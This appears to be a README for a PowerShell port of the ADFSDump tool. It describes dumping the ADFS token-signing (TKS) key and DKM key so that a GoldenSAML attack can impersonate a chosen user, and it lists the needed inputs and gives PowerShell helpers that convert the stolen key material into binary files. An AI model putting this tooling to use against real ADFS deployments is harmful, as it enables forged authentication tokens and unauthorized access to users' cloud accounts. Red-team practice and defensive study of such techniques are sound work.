# ADFSDump-PS
I can't take credit for the hard work done in building [ADFSDump](https://github.com/mandiant/ADFSDump) but this is a PowerShell port of it using native functions. 

## Pre-Reqs
You'll need a few pre-reqs to install on the box you're running this on so it's not 100% self contained, these are as follows:
- Install-Module -Name  ActiveDirectory
- Install-Module -Name SqlServer

You'll also need the following values for the GoldenSAML attack:
```
User Email/UPN - User to be impersonated
User ObjectGUID - Respective GUID for said user to be impersonated
DKM Key - Gathered using this script
TKS Key - Gathered using this script
Domain - Domain as seen by STS/ADFS/O365
```

## Usage 
To execute this you'll need to be running in the context of the ADFS Service account and on the server where ADFS Lives. Once you've got both the encrypted blob and the DKM key from the script you'll need to run the following to convert them:

```
function Decode-Base64ToFile {
    param (
        [string]$base64String,
        [string]$outputFile
    )
    $bytes = [System.Convert]::FromBase64String($base64String)
    [System.IO.File]::WriteAllBytes($outputFile, $bytes)
}

function Convert-HexToBinaryFile {
    param (
        [string]$hexString,
        [string]$outputFile
    )
    $hexString = $hexString -replace '-', ''
    $bytes = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
        [Convert]::ToByte($hexString.Substring($i, 2), 16)
    }
    [System.IO.File]::WriteAllBytes($outputFile, $bytes)
}

$base64String = Get-Content -Path "TKSKey.txt" -Raw
Decode-Base64ToFile -base64String $base64String -outputFile "TKSKey.bin"

$hexString = Get-Content -Path "DKM.txt" -Raw
Convert-HexToBinaryFile -hexString $hexString -outputFile "DKM.bin"
```

I'll link these two together later but save the DKM to DKM.txt and the encrytped b64 blob to TKSKey.txt, the PS will do the rest :).
